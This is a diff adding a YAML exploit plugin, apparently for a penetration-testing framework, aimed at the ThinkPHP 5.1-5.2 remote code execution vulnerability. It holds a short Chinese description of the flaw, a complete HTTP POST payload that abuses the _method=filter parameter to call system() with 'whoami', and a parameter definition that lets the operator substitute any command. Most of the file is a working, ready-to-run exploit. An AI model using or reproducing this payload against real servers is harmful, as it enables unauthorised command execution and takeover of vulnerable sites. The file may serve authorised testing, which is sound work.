@@ -1,0 +1,33 @@
+info:
+    app: ThinkPHP
+    name: ThinkPHP 5.1-5.2
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2019-01-11"
+    create_date: "2024-10-06 02:44:48"
+    update_date: "2024-10-06 02:44:48"
+    scope: 5.1-5.2全版本
+    description: 2019年1月11日，某安全团队公布了一篇ThinkPHP5.0.*远程代码执行漏洞文档，公布了已给ThinkPHP5.0.*远程代码执行漏洞。2019年1月15日，某安全研究员公布了一篇ThinkPHP5.1-5.2全版本远程代码执行漏洞的文章，文章中的该漏洞与ThinkPHP 5.0.*远程代码执行漏洞原理相似，攻击者可利用该漏洞在一定条件下获取目标服务器的最高权限。
+    detail: |-
+        http://www.thinkphp.com/thinkphp/public/index.php
+        需要将thinkphp/library/think/Error.php的error_reporting(E_ALL)改为error_reporting(0);
+    payload: |-
+        POST /tp5.1/public/ HTTP/1.1
+        Host: 192.168.111.111
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Connection: close
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 34
+        
+        c=system&f=whoami&&_method=filter&
+    vul_type: 代码执行
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
